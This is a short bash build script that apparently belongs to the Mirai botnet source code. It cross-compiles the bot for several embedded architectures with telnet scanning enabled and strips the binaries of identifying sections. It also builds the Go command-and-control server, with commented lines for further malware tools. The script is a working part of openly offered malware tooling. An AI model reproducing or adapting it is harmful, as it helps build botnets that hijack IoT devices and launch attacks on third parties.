#!/bin/bash

FLAGS="-DMIRAI_TELNET"
function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

gcc -std=c99 bot/*.c -DDEBUG "$FLAGS"  -lz -lrt -pthread -static -g -o debug/mirai
#mips-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.mips
#armv4l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm
#v6l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm7
#sh4-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.sh4
#gcc -std=c99 tools/enc.c -g -o debug/enc
#gcc -std=c99 tools/nogdb.c -g -o debug/nogdb
#gcc -std=c99 tools/badbot.c -g -o debug/badbot
go build -o debug/cnc cnc/*.go
#go build -o debug/scanListen tools/scanListen.go
